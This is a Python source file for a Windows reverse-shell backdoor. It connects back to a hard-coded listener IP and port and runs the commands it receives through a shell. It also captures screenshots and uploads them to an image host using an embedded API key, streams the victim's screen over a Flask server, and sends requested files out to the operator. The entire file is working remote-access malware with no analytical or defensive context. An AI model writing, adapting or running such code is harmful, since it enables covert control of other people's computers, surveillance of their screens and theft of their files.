#!/usr/bin/env python3

import os
import socket
import subprocess
import base64
import requests
from PIL import ImageGrab
import sys
import logging
import threading
app =''
LHOST = '10.195.100.240' # add ip address listner
LPORT = int(7777) # add port
hostname = socket.gethostname()
IPaddress = socket.gethostbyname(hostname)
Port = int(6655)
Stopthread = 0
class CallMeBack:
    def __init__(self):
        global Stopthread
        self.__Socket_SockClinet()

    def StreamChannel(self):            
        import cv2
        import numpy as np
        from flask import Flask, Response
        import pyautogui
        app = Flask(__name__)
        log = logging.basicConfig(filename=os.environ["appdata"]+'\\'+'server.log', level=logging.INFO, format='%(asctime)s - %(message)s')
        def generate_frames():
           while True:
                screen = capture_screen()
                ret, buffer = cv2.imencode('.jpg', screen)
                frame = buffer.tobytes()
                if Stopthread == 1 :
                   break
                yield (b'--frame\r\n'
                    b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
        def capture_screen():
            screenshot = pyautogui.screenshot()
            frame = np.array(screenshot)
            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
            return frame
        @app.route('/')
        def index():                      
            return Response(generate_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')
        if __name__=='__main__':
            sys.stdout = sys.stdout.flush()
            app.run(host='0.0.0.0',port=int(f'{Port}'),debug=False)
            
    def __Socket_SockClinet(self,LHOST=LHOST,LPORT=LPORT):
        
        global Stopthread       
        SendBack=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        SendBack.connect((LHOST,LPORT))
        path = os.getcwd()+ ' > '
        SendBack.sendall(bytes(path.encode()))     
        while True :
            data = SendBack.recv(4096).decode('latin-1')
            try:
                Data = subprocess.run(data,shell=True,capture_output=True)
                path = os.getcwd()+ ' > '  
                if 'quit' in data:
                    exit()
                elif 'cd' in data:
                    try:
                        os.chdir(str(" ".join(data.split()[1:])))
                        path = os.getcwd()+ ' > '
                    except Exception:
                         continue
                elif 'screenshot' in data :
                    snapshot = ImageGrab.grab() 
                    file =os.environ["appdata"]+'\\'+"IMage.jpg"
                    snapshot.save(file)
                    with open(os.environ["appdata"]+'\\'+"IMage.jpg", "rb") as file:
                        url = "https://api.imgbb.com/1/upload"
                        payload = {
                            "expiration": "600",
                            "key":"b205eda46389c875c103903a9adb1b3f",
                            "image": base64.b64encode(file.read()),
                        }
                        res = requests.post(url, payload)
                        respones =res.text.split('url')
                        respones = respones[2].split(',')[0].replace('"','').replace(':','',1).replace('\\','')+'\n'   
                        SendBack.sendall(bytes(path.encode())), SendBack.sendall(bytes(respones.encode()))
                        SendBack.sendall(bytes(path.encode()))          
                elif 'stream' in data:
                    Link = 'http://'+f'{IPaddress}'+':'+str(Port)
                    SendBack.sendall(bytes(path.encode())), SendBack.sendall(bytes(Link.encode()+'\n'.encode('latin-1')))
                    SendBack.sendall(bytes(path.encode()))
                    thread = threading.Thread(target=self.StreamChannel)  
                    thread.start()
                    continue
                elif 'kill' in data:
                    Stopthread = 1              
                    StreamStop = 'Stream is End\n'.encode('latin-1')  
                    SendBack.sendall(bytes(path.encode())), SendBack.sendall(bytes(StreamStop))
                    SendBack.sendall(bytes(path.encode()))
                elif 'getfile' in data :
                    data = data.split()
                    with open(str("".join(data[-1])),'rb') as FileData:
                        FileData = FileData.read()     
                        SendBack.send(len(FileData).to_bytes(4, byteorder='big'))
                        SendBack.sendall(FileData)
                elif 'returncode=1' in str(Data) :
                       Except = str(data) +' not recognized as an internal or external command'.replace('\n','')
                       SendBack.sendall(bytes(path.encode())), SendBack.sendall(Except.encode()+'\n'.encode('latin-1'))
                       SendBack.sendall(bytes(path.encode())) 
  
                else:
                     Data =bytes(Data.stdout.decode('latin-1').encode())
                     SendBack.sendall(Data)
                     SendBack.sendall(bytes(path.encode()))
            except Exception :
               continue 


if __name__=='__main__':
     CallMeBack()
